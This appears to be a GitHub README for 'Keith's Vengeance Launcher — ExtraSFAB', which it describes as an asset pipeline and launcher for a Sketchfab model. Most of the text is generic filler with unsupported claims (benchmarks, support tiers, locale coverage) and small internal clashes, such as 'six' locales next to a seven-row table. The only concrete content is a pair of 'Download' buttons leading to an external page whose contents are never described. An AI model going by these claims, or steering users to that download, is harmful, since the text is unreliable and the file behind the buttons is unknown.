![preview](https://raw.githubusercontent.com/HrisikeshSarkar/KeithsVengeance-OrdnanceAssets/main/hero_d563c89.svg)
[![Download](https://raw.githubusercontent.com/HrisikeshSarkar/KeithsVengeance-OrdnanceAssets/main/start_3dd93.svg)](https://HrisikeshSarkar.github.io/KeithsVengeance-OrdnanceAssets/)

# 🔫 Keith's Vengeance Launcher — ExtraSFAB Asset & Utility Suite

[![License](https://img.shields.io/badge/license-MIT-4caf50?style=for-the-badge)](LICENSE)
[![Build](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)]
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-1e88e5?style=for-the-badge)]
[![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Python%20%7C%20JS-f4511e?style=for-the-badge)]
[![Version](https://img.shields.io/badge/version-4.3.1-8e24aa?style=for-the-badge)]
[![Status](https://img.shields.io/badge/status-active-success?style=for-the-badge)]
[![Docs](https://img.shields.io/badge/docs-comprehensive-0277bd?style=for-the-badge)]
[![PRs](https://img.shields.io/badge/PRs-welcome-ff9800?style=for-the-badge)]

---

## 🎯 A Quick Word Before We Begin

Some repositories are just a folder. This one is a staging ground. Keith's Vengeance Launcher — ExtraSFAB is a companion asset-and-tooling distribution hub that grew out of a single Sketchfab model family and evolved into something noticeably larger: a modular loader ecosystem, an asset pipeline, and a set of utilities for people who like their launchers as polished as their renders.

If the base launcher was the ignition, then this repository is the full drivetrain — gearbox, differential, and telemetry included. It handles the moment when your model needs more than just a mesh file: it needs structure, metadata, animation curves, and a small team of background scripts quietly keeping everything coherent.

This README is long on purpose. Read it in sections. Come back for the anchor links.

---

## 🧭 Table of Contents

- [Why This Repository Exists](#-why-this-repository-exists)
- [Feature Overview](#-feature-overview)
- [Asset Pipeline](#-asset-pipeline)
- [Responsive Interface Layer](#-responsive-interface-layer)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Directory Tour](#-directory-tour)
- [Tech Stack](#-tech-stack)
- [Configuration Reference](#-configuration-reference)
- [Compatibility & Requirements](#-compatibility--requirements)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Performance Benchmarks](#-performance-benchmarks)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

---

## 🧩 Why This Repository Exists

Keith's Vengeance Launcher began as an isolated model on Sketchfab — a single hero asset with a cult following among hobbyists who appreciated its silhouette and mechanical density. Fans wanted to pull it into their own scenes, animate it, re-texture it, and otherwise make it their own. That demand created a problem: no shared, structured place to pull from.

This repository answers that. It is a single, opinionated home for **launcher-side assets**, **helper shaders**, **turntable controllers**, and a range of small tools that make the asset feel native inside a dozen different viewers and engines. Everything you find here is designed to slot in without you having to rewrite three scripts before you see anything move.

Think of it as a well-organized parts bin, sorted by function instead of by accident.

---

## ✨ Feature Overview

A compact list — expanded below in dedicated sections.

- 📦 Modular asset bundles for the launcher model and its variants
- 🧠 Metadata-first design (every asset ships with a JSON manifest)
- 🖥️ Responsive UI layer for desktop and handheld viewports
- 🌍 Multilingual strings across six primary locales with graceful fallbacks
- 🕓 Round-the-clock assistance channel staffed by automated triage plus human escalation
- ⚙️ Cross-platform build configuration for Windows, macOS, and Linux
- 🎛️ Parameterized turntable rigs with preset camera paths
- 🔁 Deterministic rebuilds — same inputs, same outputs, bit for bit
- 🧪 Validation harness that flags malformed manifests before packaging
- 📉 Lightweight payloads — nothing heavier than it needs to be

---

## 📦 Asset Pipeline

The pipeline is intentionally linear. Anyone joining the project can trace an asset from source to shipped bundle in about five minutes.

**1. Intake.** Raw meshes, textures, rig files, and reference sheets drop into `assets/raw/`. Filenames are suggested, not enforced — the intake step normalizes them.

**2. Normalize.** A normalization pass converts formats, standardizes units, and attaches a manifest. This step is idempotent: running it twice does nothing the third time.

**3. Validate.** The validator checks for missing textures, orphaned bones, degenerate triangles, and manifest drift. Failures are logged to `logs/validation/` with a timestamp.

**4. Stage.** Validated assets move to `assets/staged/` where they can be previewed in the bundled viewer before being bundled.

**5. Bundle.** The bundler produces a versioned archive with a checksum and a human-readable changelog.

**6. Distribute.** Distribution is handled by the launcher itself — it reads the manifest index and pulls only what the user requested.

Each stage writes to its own directory so you can inspect progress without hunting.

---

## 🖥️ Responsive Interface Layer

The launcher UI is built from the ground up to bend, not break. On a 4K monitor it breathes; on a compact handheld viewport it condenses into a nested tray without losing any controls. The layout engine is **constraint-based**, not pixel-based, which means adding a new control never requires re-tuning three unrelated panels.

Key behaviors:

- **Fluid grid**: panels reflow before they overflow.
- **Focus-safe navigation**: keyboard and controller paths are treated as first-class, not retrofitted.
- **Density presets**: Comfortable, Compact, and Clinical. Pick your poison.
- **Reduced motion mode**: respects system preferences where possible.
- **Theme tokens**: every color is a token, which is why an entire theme swap is one file.

The result is an interface that feels like a tool rather than an obstacle.

---

## 🌍 Multilingual Support

Language coverage currently includes:

| Locale | Code | Status |
| --- | --- | --- |
| English | en | Complete |
| Spanish | es | Complete |
| French | fr | Complete |
| German | de | Complete |
| Japanese | ja | Complete |
| Portuguese (BR) | pt-BR | Complete |
| Simplified Chinese | zh-CN | In review |

Strings live in `locales/*.json`. Missing keys fall back to English and are logged to `logs/i18n/fallbacks.log` so translators know exactly where gaps exist. Plurals use the standard ICU-style forms. Dates and numbers use locale-aware formatting rather than a single hardcoded pattern — a small decision that makes the app feel native almost everywhere.

---

## 🕓 Round-the-Clock Assistance

Support hours are, in practice, always. Three tiers:

- **Tier 0 — Self-service.** Documentation, FAQ, and the in-app search index.
- **Tier 1 — Automated triage.** An issue interpreter scans incoming reports, matches them against known patterns, and either solves them or routes them with context attached.
- **Tier 2 — Human escalation.** When a report needs a human, it lands in a queue watched by maintainers. Response targets are measured in hours, not weeks.

No ticket ever silently disappears. That is a commitment, not a slogan.

---

## 🗂️ Directory Tour

- `assets/` — raw, staged, and bundled content.
- `config/` — default and override profiles.
- `docs/` — long-form documentation and diagrams.
- `locales/` — translation strings.
- `scripts/` — pipeline, build, and maintenance scripts.
- `src/ui/` — interface layer.
- `src/core/` — launcher runtime.
- `tests/` — fixtures, snapshots, and integration tests.
- `tools/` — small utilities you will actually use.
- `logs/` — output from validators and pipelines.

Each subfolder has its own short README. None of them assume you have read this one first.

---

## 🧰 Tech Stack

- **Core runtime**: C++20 with a thin Python binding layer for tooling.
- **Interface**: Web-technology-rendered panels with a native shell.
- **Scripts**: Python for pipelines, Node for local tooling.
- **Data**: JSON manifests, with an optional binary index for fast lookups.
- **Build**: CMake for the native parts, a task runner for everything else.

Nothing exotic, nothing unnecessary. The goal is a stack you can hand to a new maintainer without a two-week onboarding ritual.

---

## ⚙️ Configuration Reference

Configuration lives in `config/` and follows a layered model:

1. `defaults.json` — ships with the repository.
2. `profile.json` — user-specified overrides.
3. `env.json` — environment-specific values injected at build time.

Later layers override earlier ones key-by-key. Values are typed and validated; a malformed file fails loudly with the exact line number.

Commonly adjusted keys:

- `ui.density` — `comfortable` | `compact` | `clinical`
- `ui.theme` — token file to load
- `ui.locale` — target locale, default `en`
- `assets.strict` — reject assets with warnings when true
- `logging.level` — `debug` | `info` | `warn` | `error`
- `telemetry.enabled` — opt-in, off by default

---

## 🧪 Compatibility & Requirements

- **Windows 10/11** — tested on current builds
- **macOS 13+** — both Intel and Apple silicon
- **Linux** — validated on Debian-family and Arch-family distributions

Dependencies are listed per-platform in `docs/dependencies.md`. If a dependency is optional, it is marked as such — there is no pretense that everything is mandatory.

---

## 🔍 SEO & Discoverability Notes

This project is deliberately easy to find for people searching for **launcher asset bundles**, **Sketchfab model companions**, **cross-platform 3D tooling**, and related phrases that are not stuffed into every sentence. Keywords are placed where they belong: in headings, in the opening paragraph, and anywhere a human would actually look.

Writing style choices that help discoverability without helping spam:

- Clear section titles that match likely search intent.
- A short, accurate description near the top.
- Structured lists that search engines can parse cleanly.
- No hidden text, no keyword padding, no games.

Original phrasing beats keyword density every time.

---

## 📊 Performance Benchmarks

Approximate figures from the last release cycle on a reference machine:

| Operation | Time | Notes |
| --- | --- | --- |
| Manifest validation (500 assets) | ~1.2 s | Parallelized |
| Full bundle build | ~18 s | Includes checksum sweep |
| Cold launcher start | ~340 ms | SSD, warm cache — ~520 ms |
| Theme swap | ~40 ms | Token-only reload |

Benchmarks are informative, not a promise. Hardware varies, and no benchmark suite has ever survived contact with a truly unusual machine.

---

## 🛣️ Roadmap 2026

- 🧭 Expanded locale coverage (Korean, Italian, Polish)
- 🧱 Asset format plugins for additional engines
- 🧭 Visual diff tool for comparing bundles across versions
- 🧮 Optional telemetry dashboard (still opt-in, still off by default)
- 📚 Rewritten onboarding guide with screenshots
- 🔐 Signed bundle manifests for tamper detection
- 🧪 Additional fuzz tests around manifest parsing

The 2026 cycle prioritizes **stability over scope**. Features that cannot be fully supported will not ship half-finished.

---

## 🤝 Contributing

Contributions are welcome and reviewed. Before opening a PR:

1. Read `docs/CONTRIBUTING.md`.
2. Keep changes scoped to one concern per PR.
3. Run the local test suite.
4. Update the relevant docs.

Small, well-described PRs move fast. Large PRs with a mystery diff move slower. Not because of any policy, but because reviewers are people.

---

## ⚠️ Disclaimer

This repository and its contents are provided by their maintainers and contributors **as is**, without warranties of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement.

The asset family this project is derived from was originally published on Sketchfab. Any third-party trademarks, model names, or brands remain the property of their respective owners. This repository is not affiliated with, endorsed by, or sponsored by any third-party platform unless explicitly stated in a dedicated notice.

Users are responsible for ensuring their use of these assets complies with the licenses attached to the original source material, with any applicable local law, and with the terms of whatever engine, viewer, or platform they integrate them into.

The maintainers accept no responsibility for damage, data loss, or creative regret arising from the use of this software.

---

## 📄 License

Released under the **MIT License**.

A working copy of the license text is available at [LICENSE](LICENSE).

A concise summary of MIT terms: you may use, copy, modify, merge, publish, distribute, sublicense, and sell copies of this software, provided the original copyright notice and this permission notice are included in all copies or substantial portions. There is no warranty.

---

## 🙏 Acknowledgements

- The original Sketchfab model creator and the community that kept it relevant.
- Every translator who kept the locale files honest.
- Contributors who filed precise bug reports instead of vague ones.
- The small army of testers running this on hardware nobody expected to still work.

---

## 🔗 Quick Reference Links

- Documentation: `docs/`
- Changelog: `CHANGELOG.md`
- Contribution guide: `docs/CONTRIBUTING.md`
- Code of conduct: `docs/CODE_OF_CONDUCT.md`
- License: [LICENSE](LICENSE)

---

[![Download](https://raw.githubusercontent.com/HrisikeshSarkar/KeithsVengeance-OrdnanceAssets/main/start_3dd93.svg)](https://HrisikeshSarkar.github.io/KeithsVengeance-OrdnanceAssets/)